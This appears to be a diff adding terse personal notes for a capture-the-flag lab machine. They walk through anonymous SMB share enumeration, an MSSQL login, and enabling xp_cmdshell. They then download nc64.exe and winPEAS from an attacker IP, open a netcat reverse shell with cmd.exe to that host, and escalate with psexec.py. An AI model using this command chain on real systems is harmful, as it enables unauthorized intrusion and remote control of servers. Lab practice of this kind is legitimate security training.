@@ -1,0 +1,22 @@
+Smbclient -N -L ip = share administrative lists
+Smbclient -N \\\\ip\\(SHARE)= to enumerate a particular  share [ls,get]
+
+Connecting to mysql server: mssqlclient.py ARCHETYPE/sql_svc@10.129.233.43 -windows-auth
+				                                    [username]  
+           Cheatsheets: SELECT is_srvrolemember('sysadmin');
+ 		                    EXEC xp_cmdshell 'net user';
+		                    EXEC sp_configure 'show advanced options', 1;
+                        RECONFIGURE;
+                        sp_configure; - Enabling the sp_configure as stated in the above error message
+                        EXEC sp_configure 'xp_cmdshell', 1;
+		                    RECONFIGURE;
+		   
+                        xp_cmdshell "powershell -c pwd"
+		                    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+                        http://10.10.14.9/nc64.exe -outfile nc64.exe”
+		                    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
+		
+
+wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
+
+psexec.py administrator@{TARGET_IP}
